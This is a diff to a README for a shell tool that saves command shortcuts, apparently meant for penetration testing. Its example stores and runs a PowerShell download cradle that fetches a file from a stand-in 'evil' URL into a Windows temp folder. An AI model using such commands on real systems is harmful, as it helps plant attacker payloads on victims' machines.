@@ -58,6 +58,12 @@ Add command
 
 ```bash
 $ ./shakti.sh add psdf 'echo "IEX(New-Object Net.WebClient).DownloadFile(\"$2\",\"$3\")"' 'Powershell Download Files'
+Shortcut psdf added
 ```
 
 Run your shortcut
+
+```
+./shakti.sh psdf 'http://127.0.0.1/evil' 'C:\windows\tmp\very_nice_app'
+IEX(New-Object Net.WebClient).DownloadFile("http://127.0.0.1/evil","C:\windows\tmp\very_nice_app")
+```
